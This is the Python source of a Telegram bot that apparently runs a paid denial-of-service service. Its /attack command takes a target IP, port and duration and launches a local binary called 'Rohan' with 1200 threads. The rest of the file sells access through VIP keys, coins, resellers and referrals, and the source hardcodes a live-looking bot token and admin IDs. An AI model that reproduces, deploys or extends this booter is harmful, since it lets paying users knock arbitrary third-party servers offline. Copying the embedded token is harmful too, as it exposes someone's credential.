import asyncio
import sqlite3
import datetime
import random
import string
import os
import subprocess
from aiogram import Bot, Dispatcher, types
from aiogram.types import Message, ChatMemberUpdated
from aiogram.filters import Command
import json
from dotenv import load_dotenv

load_dotenv()

TOKEN = ("8094930692:AAGy-bnpYA0A1j6B3lRWol-GyfK9gtiMwCo")
ADMIN_ID = ("1866961136")
GROUP_ID = ("-1002328886935")
DATA_FILE = "bot_data.json"
BINARY_PATH = "./Rohan"  # Path to the Rohan binary
PACKET_SIZE = "512"     # Fixed packet size
THREADS = "1200"        # Fixed thread count

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Database Connection
conn = sqlite3.connect("bot_data.db", check_same_thread=False)
cursor = conn.cursor()

# Create Tables
cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY, 
    coins INTEGER DEFAULT 0, 
    vip_expiry TEXT DEFAULT NULL,
    invites INTEGER DEFAULT 0
)""")

cursor.execute("""
CREATE TABLE IF NOT EXISTS attack_logs (
    user_id INTEGER, 
    target TEXT, 
    duration INTEGER, 
    timestamp TEXT
)""")

conn.commit()

# Generate Key Function
def generate_key():
    return "Rohan-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))

# Attack Command with Binary Execution
@dp.message(Command(commands=['attack']))
async def attack(message: Message):
    user_id = message.from_user.id
    cursor.execute("SELECT vip_expiry FROM users WHERE user_id=?", (user_id,))
    user = cursor.fetchone()

    if not user or not user[0]:
        return await message.reply("❌ You don't have access.\nDM to buy - @Rohan2349")

    args = message.text.split()[1:]
    if len(args) != 3:
        return await message.reply("Usage: `/attack <IP> <Port> <Duration>`")

    ip, port, duration = args
    try:
        duration = int(duration)
    except ValueError:
        return await message.reply("❌ Duration must be a number")

    # Log the attack
    cursor.execute("INSERT INTO attack_logs (user_id, target, duration, timestamp) VALUES (?, ?, ?, ?)", 
                   (user_id, f"{ip}:{port}", duration, datetime.datetime.now()))
    conn.commit()

    countdown_msg = await message.reply(f"🚀 Attack Started!\n🎯 Target: {ip}:{port}\n⏳ Duration: {duration} sec\n📦 Packet Size: {PACKET_SIZE}\n🧵 Threads: {THREADS}")

    try:
        # Execute the binary with packet size and threads
        process = subprocess.Popen(
            [BINARY_PATH, ip, port, str(duration), PACKET_SIZE, THREADS],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        # Monitor duration and update countdown
        while duration > 0:
            await asyncio.sleep(1)
            duration -= 1
            await countdown_msg.edit_text(f"⏳ Time Left: {duration}s\n🎯 Target: {ip}:{port}\n📦 Packet Size: {PACKET_SIZE}\n🧵 Threads: {THREADS}")

        # Wait for process to complete
        stdout, stderr = process.communicate()
        
        if process.returncode == 0:
            await countdown_msg.edit_text("✅ Attack Completed!")
        else:
            await countdown_msg.edit_text(f"❌ Attack Failed!\nError: {stderr.decode()}")

    except FileNotFoundError:
        await countdown_msg.edit_text("❌ Error: Rohan binary not found!")
    except Exception as e:
        await countdown_msg.edit_text(f"❌ Error: {str(e)}")

# Buy VIP Key
@dp.message(Command(commands=['buy_key']))
async def buy_key(message: Message):
    user_id = message.from_user.id
    args = message.text.split()
    if len(args) != 2:
        return await message.reply("Usage: `/buy_key <days>`\nPrices: 1H=50, 1D=100, 3D=500, 7D=700, 30D=1500 coins.")

    day_map = {"1H": 50, "1D": 100, "3D": 500, "7D": 700, "30D": 1500}
    days = args[1]

    if days not in day_map:
        return await message.reply("Invalid option. Choose from: 1H, 1D, 3D, 7D, 30D.")

    cost = day_map[days]
    cursor.execute("SELECT coins FROM users WHERE user_id=?", (user_id,))
    user = cursor.fetchone()

    if not user or user[0] < cost:
        return await message.reply("❌ Insufficient coins!")

    new_key = generate_key()
    cursor.execute("UPDATE users SET coins = coins - ? WHERE user_id=?", (cost, user_id))
    conn.commit()

    await message.reply(f"✅ Here is your VIP key: `{new_key}`\nUse `/redeem {new_key}` to activate.")

# Reseller Table
cursor.execute("""
CREATE TABLE IF NOT EXISTS resellers (
    user_id INTEGER PRIMARY KEY
)""")
conn.commit()

# Check Reseller
def is_reseller(user_id):
    cursor.execute("SELECT user_id FROM resellers WHERE user_id=?", (user_id,))
    return cursor.fetchone() is not None

# Add Reseller
@dp.message(Command(commands=['add_reseller']))
async def add_reseller(message: Message):
    if message.from_user.id != ADMIN_ID:
        return await message.reply("❌ Only the owner can add resellers.")

    args = message.text.split()
    if len(args) != 2:
        return await message.reply("Usage: `/add_reseller <user_id>`")

    user_id = int(args[1])
    cursor.execute("INSERT OR IGNORE INTO resellers (user_id) VALUES (?)", (user_id,))
    conn.commit()

    await message.reply(f"✅ User `{user_id}` is now a reseller.")

# Remove Reseller
@dp.message(Command(commands=['remove_reseller']))
async def remove_reseller(message: Message):
    if message.from_user.id != ADMIN_ID:
        return await message.reply("❌ Only the owner can remove resellers.")

    args = message.text.split()
    if len(args) != 2:
        return await message.reply("Usage: `/remove_reseller <user_id>`")

    user_id = int(args[1])
    cursor.execute("DELETE FROM resellers WHERE user_id=?", (user_id,))
    conn.commit()

    await message.reply(f"✅ User `{user_id}` is no longer a reseller.")

# Add Coins
@dp.message(Command(commands=['add_coins']))
async def add_coins(message: Message):
    if not is_reseller(message.from_user.id):
        return await message.reply("❌ Only resellers can use this command.")

    args = message.text.split()
    if len(args) != 3:
        return await message.reply("Usage: `/add_coins <user_id> <amount>`")

    user_id, amount = int(args[1]), int(args[2])
    cursor.execute("UPDATE users SET coins = coins + ? WHERE user_id=?", (amount, user_id))
    conn.commit()

    await message.reply(f"✅ Added {amount} coins to `{user_id}`.")

# Generate Keys
@dp.message(Command(commands=['generate_key']))
async def generate_key_command(message: Message):
    if not is_reseller(message.from_user.id):
        return await message.reply("❌ Only resellers can use this command.")

    args = message.text.split()
    if len(args) != 3:
        return await message.reply("Usage: `/generate_key <duration> <quantity>`")

    duration, quantity = args[1], int(args[2])
    keys = [generate_key() for _ in range(quantity)]
    keys_text = "\n".join(keys)

    await message.reply(f"✅ Generated {quantity} keys for `{duration}`:\n```\n{keys_text}\n```")

# Reseller Stats
@dp.message(Command(commands=['reseller_stats']))
async def reseller_stats(message: Message):
    if not is_reseller(message.from_user.id):
        return await message.reply("❌ Only resellers can use this command.")

    cursor.execute("SELECT SUM(coins) FROM users")
    total_coins = cursor.fetchone()[0] or 0

    cursor.execute("SELECT COUNT(user_id) FROM users WHERE vip_expiry IS NOT NULL")
    active_vips = cursor.fetchone()[0]

    cursor.execute("SELECT COUNT(user_id) FROM resellers")
    total_resellers = cursor.fetchone()[0]

    await message.reply(f"📊 **Reseller Stats:**\n💰 Total Coins Sold: {total_coins}\n👑 Active VIPs: {active_vips}\n🔹 Resellers: {total_resellers}")

# Set VIP Pricing
@dp.message(Command(commands=['set_price']))
async def set_price(message: Message):
    if message.from_user.id != ADMIN_ID:
        return await message.reply("❌ Only the owner can modify prices.")

    args = message.text.split()
    if len(args) != 3:
        return await message.reply("Usage: `/set_price <duration> <coins>`")

    duration, coins = args[1], int(args[2])
    day_map = {"1H": 50, "1D": 100, "3D": 500, "7D": 700, "30D": 1500}

    if duration not in day_map:
        return await message.reply("Invalid duration. Choose from: 1H, 1D, 3D, 7D, 30D.")

    day_map[duration] = coins
    await message.reply(f"✅ Price updated: `{duration}` = `{coins}` coins.")

# Redeem VIP Key
@dp.message(Command(commands=['redeem']))
async def redeem(message: Message):
    user_id = message.from_user.id
    args = message.text.split()
    if len(args) != 2 or not args[1].startswith("Rohan-"):
        return await message.reply("Invalid key format. Example: `Rohan-ABCD`")

    expiry_time = datetime.datetime.now() + datetime.timedelta(days=1)
    cursor.execute("UPDATE users SET vip_expiry=? WHERE user_id=?", (expiry_time.strftime("%Y-%m-%d %H:%M:%S"), user_id))
    conn.commit()

    await message.reply("🎉 VIP Activated! Check with `/info`.")

# Referral System
@dp.message(Command(commands=['invite']))
async def invite(message: Message):
    user_id = message.from_user.id
    invite_link = f"https://t.me/{bot.username}?start={user_id}"
    await message.reply(f"👥 Invite Friends & Earn Coins!\n🔗 {invite_link}")

@dp.chat_member()
async def track_invites(update: ChatMemberUpdated):
    if update.chat.id != GROUP_ID or update.new_chat_member.status != "member":
        return

    inviter_id = update.from_user.id
    cursor.execute("UPDATE users SET invites = invites + 1, coins = coins + 10 WHERE user_id=?", (inviter_id,))
    conn.commit()

    await bot.send_message(inviter_id, "🎉 New Invite! +10 Coins.")

# Leaderboard
@dp.message(Command(commands=['leaderboard']))
async def leaderboard(message: Message):
    cursor.execute("SELECT user_id, invites FROM users ORDER BY invites DESC LIMIT 10")
    top_users = cursor.fetchall()
    leaderboard_msg = "🏆 **Top Referrers** 🏆\n\n" + "\n".join(
        [f"{i+1}. [User {user_id}]: {invites} invites" for i, (user_id, invites) in enumerate(top_users)]
    )
    await message.reply(leaderboard_msg)

# Admin Shutdown Command
@dp.message(Command(commands=['shutdown']))
async def shutdown(message: Message):
    if message.from_user.id != ADMIN_ID:
        return await message.reply("❌ Unauthorized.")
    
    await message.reply("🛑 Bot shutting down...")
    await bot.close()

# Background Task for VIP Expiry
async def check_vip_expiry():
    while True:
        now = datetime.datetime.now()
        cursor.execute("SELECT user_id FROM users WHERE vip_expiry <= ?", (now.strftime("%Y-%m-%d %H:%M:%S"),))
        expired_users = cursor.fetchall()

        for user_id in expired_users:
            cursor.execute("UPDATE users SET vip_expiry=NULL WHERE user_id=?", (user_id,))
            conn.commit()
            await bot.send_message(user_id, "🚨 Your VIP has expired!")

        await asyncio.sleep(3600)

# Start Bot
async def main():
    # Verify binary exists before starting
    if not os.path.exists(BINARY_PATH):
        print(f"Warning: Binary {BINARY_PATH} not found!")
    
    # Start the VIP expiry check task
    asyncio.create_task(check_vip_expiry())
    
    # Start polling with the bot instance
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())